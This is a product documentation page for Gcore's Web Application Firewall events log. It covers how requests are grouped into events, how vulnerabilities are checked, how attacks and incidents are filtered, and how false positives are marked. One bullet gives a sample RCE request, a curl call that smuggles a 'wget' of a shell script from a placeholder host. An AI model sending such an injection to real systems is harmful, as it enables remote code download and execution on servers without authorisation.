---
title: view-the-history-of-attacks-on-your-application
displayName: View events
published: true
order: 10
toc:
   --1--Events: "about-events"
   --2--How WAF combines requests: "how-waf-combines-requests-into-a-single-entity"
   --2--How WAF identifies vulnerabilities: "how-waf-identifies-vulnerabilities"
   --2--Usefulness: "what-is-the-usefulness-of-events"
   --1--Attacks: "attacks"
   --2--About attacks: "about-attacks"
   --2--Check attacks: "check-attacks"
   --2--Ongoing attacks: "attacks-that-are-happening-currently"
   --1--Incidents: "incidents"
   --2--About incidents: "about-incidents" 
   --2--Check incidents: "check-incidents"
   --1--False positive: "false-positive"
pageTitle: Explore WAF's Events | Gcore
pageDescription: Identify cyber attacks, find vulnerabilities, block IPs, and gather insightful analytics for superior application security with the WAF events log.
---
# View the history of attacks on your application
   
## About Events

Events store logs containing all malicious requests for your resources repelled by <a href="https://gcore.com/web-security" target="_blank">Web Application Firewall (WAF)</a>. All entries in the log section are categorized into <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#attacks" target="_blank">Attacks</a> and <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#incidents" target="_blank">Incidents</a>.

Here is how the log section appears:

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/event-10.png" alt="Events log" width="80%">

### How WAF combines requests into a single entity

Every entry in the log is referred to as an event. An event can be a single malicious request or several related malicious requests. For instance, if a hacker attempts to insert harmful code into an XML document's structure with one request, the log records this as an individual event. Conversely, if a hacker attempts to crack a password by making a thousand requests, the log clusters all these requests into one event, categorizing it as a “brute force” attack. You can access this event and examine the details of each of the thousand requests.

WAF groups several requests into a single event if they share three common aspects:

- **Attack type**—this could be sqli, xss, rce, ptrav, crlf, nosqli, overlimit_res, xxe, ldapi, scanner, ssti, ssi, mail_injection, invalid_xml, data_bomb, dirbust, brute, vpatch, infoleak, or redir.
- **Payload** is a segment of a harmful request that includes directives for the targeted application and aids in identifying the attack type. For instance, if an attacker aims to insert harmful code into your application (RCE attack) and sends this request: ```curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh```. The harmful payload is ```wget+http://s```, which instructs the application to start downloading data. Remember that some malicious requests, such as various brute-force attacks, don't carry a payload.
- **The URL of a webpage or application file** the request is sent to.

Despite these commonalities, the attacker's IP address and the timing of the requests may vary. Though requests originate from different IP addresses and are sent on separate days, they will be consolidated into one event if they utilize the same attack type, payload, and target URL.

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/image_1863.png" alt="attack type" width="80%">

### How WAF identifies vulnerabilities

Here's how our WAF identifies vulnerabilities:

1. Periodically, it sends out various non-harmful test requests to gauge the application's response. These requests aren't malicious but provide insight into how the application would respond during a real attack.
2. When an actual attack occurs, WAF stops it. Then, it duplicates the attack request, removes the malicious element and cookies, and sends several similar requests to the application under its name. These requests won't cause damage, but they assist in understanding how the application would react to an attack if WAF didn't intervene.
3. It assesses the outcome of the checks from Steps 1 and 2. If the requests achieve their intended result, WAF deems that a vulnerability exists. If the application's response doesn't suggest it's susceptible to an attack, then there's no vulnerability.

Here's an example of the check: An attacker sends an “open redirect” (redir) type request—this type of attack alters links within your application so that when a user clicks on a link, they're directed to a fraudster’s page. WAF identifies the malicious request, removes the cookies and the malicious part, and then sends several such “neutralized” requests to the application on its behalf. WAF considers it a vulnerability if the application doesn't reject the requests. If the application stops the requests, WAF determines there's no vulnerability.

### What is the usefulness of Events?

Events provide detailed insights into malicious requests directed at your application. Here are three scenarios where this can be beneficial:

**Identify and resolve vulnerabilities**. By examining “incident”-type events, you can determine which parts of your application are susceptible and which types of attacks. This allows you to address these vulnerabilities.

**Prevent specific attacks**. The event log lets you see if your application is frequently targeted from a particular region or IP address. While these attacks are innocuous (since WAF blocks them), they still require processing by your server, thereby draining resources. To conserve server resources, you can block the offending IP addresses or regions in the “Access Settings” as per the <a href="https://gcore.com/docs/web-security/set-the-access-policy-for-a-protected-resource" target="_blank">Access Policy guide</a>.

**Gather analytical data to secure the private sections of your application**. By analyzing the log of malicious requests, you can understand the most common attack techniques and the IP addresses frequently used. Using this information, you can better protect internal resources not covered by WAF (like an application administration panel or a private platform for employees) against common attacks. Additionally, you can block the IP addresses of frequent offenders.

## Attacks

### About attacks

Attacks refer to any malicious request. However, not all attack-type events pose a threat. Some malicious requests cannot inflict damage as they target highly secured sections of an application. Even without WAF, your application could manage these requests. Yet, other requests pose a genuine risk as they aim at weaknesses—if WAF hadn't intercepted them, they could have harmed the application. These high-risk requests are classified as incidents.

### Check attacks

Go to “Events” and select the **Attacks** section. To find the required data, set search filters:

- **Date**. The date and time of the malicious request
   - If several requests of the same type were detected at short intervals, the attack duration appears under the date. Duration is the period between a certain type's first request and the same type's last request in the specified timeframe
   - If the attack is happening at the current moment, an appropriate label is displayed

- **Payloads**. Attack type and the number of unique malicious payloads
- **Hits**. The attack's number of hits (requests) in the specified time frame
- **Top IP / Source**. The IP address from which the malicious requests originated. When the malicious requests originate from several IP addresses, the interface shows the IP address responsible for the most requests. There is also the following data displayed for the IP address:

   - The total number of IP addresses from which the requests in the same attack originated during the specified timeframe
   - The country/region in which the IP address is registered (if it was found in databases like IP2Location or others)
   - The source type, like Public proxy, Web proxy, Tor, or the cloud platform the IP is registered in, etc (if it was found in databases like IP2Location or others)
   - The *Malicious IPs* label will appear if the IP address is known for malicious activities. This is based on public records and expert validations

- **Domain / Path**. The domain, path, and the application ID that the request targeted
- **Code**. Response code
- **Parameter**. The malicious request’s parameters and tags of parsers applied to the request

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/waf-attacks.jpg" alt="How attacks are displayed in the WAF console" width="80%">

### Attacks that are happening currently

You can monitor ongoing attacks in real time. If malicious requests are targeting your company resources, you will see this information in the “Attacks” section: 

- The total count of events that have occurred in the last five minutes. This number can be found beside and within the “Attacks” section.
- A special label will be visible in the attacks or incidents tab, positioned under the event date.

**Note**: For a more focused view, you can add a new keyword to the search field to display only those events happening at the moment: ```attacks now```.

## Incidents

### About incidents

Incidents refer to a malicious request that aims at an application's weak spot. When WAF encounters a harmful request, it blocks it and records an attack-type event. It then evaluates whether the request targets a weak or secure section of the application. If the target is a weak spot, WAF documents an incident. WAF takes no further action if the target is a robustly protected section.

### Check Incidents

WAF detects <a href="https://gcore.com/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application#how-waf-identifies-vulnerabilities" target="_blank">vulnerabilities</a> and creates security incidents.

You can check detected incidents in the **Incidents** section. To find the required data, use the search field described here or manually set the required filters.

- **Date**. The date and time of the malicious request
   - If several requests of the same type were detected at short intervals, the attack duration appears under the date. Duration is the period between a certain type's first request and the same type's last request in the specified timeframe
   - If the attack is happening at the current moment, an appropriate label is displayed

- **Payloads**. Attack type and the number of unique malicious payloads
- **Hits**. The attack's number of hits (requests) in the specified time frame
- **Top IP / Source**. The IP address from which the malicious requests originated. When the malicious requests originate from several IP addresses, the interface shows the IP address responsible for the most requests. There is also the following data displayed for the IP address:

   - The total number of IP addresses from which the requests in the same attack originated during the specified timeframe
   - The country/region in which the IP address is registered (if it was found in databases like IP2Location or others)
   - The source type, like Public proxy, Web proxy, Tor, or the cloud platform the IP is registered in, etc (if it was found in databases like IP2Location or others)
   - The *Malicious IPs* label will appear if the IP address is known for malicious activities. This is based on public records and expert validations

- **Domain / Path**. The domain, path, and the application ID that the request targeted
- **Status**. The attack blocking status (depends on the traffic filtration mode):
   - *Blocked*: all hits of the attack were blocked by the filtering node
   - *Partially* blocked: some hits of the attack were blocked, and others were only registered
   - *Monitoring*: all hits of the attack were registered but not blocked

## False positive

False positives happen when indications of an attack are mistakenly identified in a legitimate request. Upon investigating the attack, you may determine that all or some requests are false positives. To avoid having the filtering node classify similar requests as attacks in subsequent traffic analyses, you can label a few requests or the entire attack or incident as a false positive.

To mark all Hits in the attack as false positives:

1\. Go to the Attacks or Incidents section and select an attack with valid requests.

**Note**: To reduce the request analysis time, you can hide the precisely malicious requests by using the tag ```!known```.

2\.  Click + in the event line and then **Mark as false positive**.

<img src="https://assets.gcore.pro/docs/web-security/manage-waf/view-the-history-of-attacks-on-your-application/13308797025553.png" alt="Mark requests as false positive" width="80%">

That’s it. WAF will stop blocking such requests.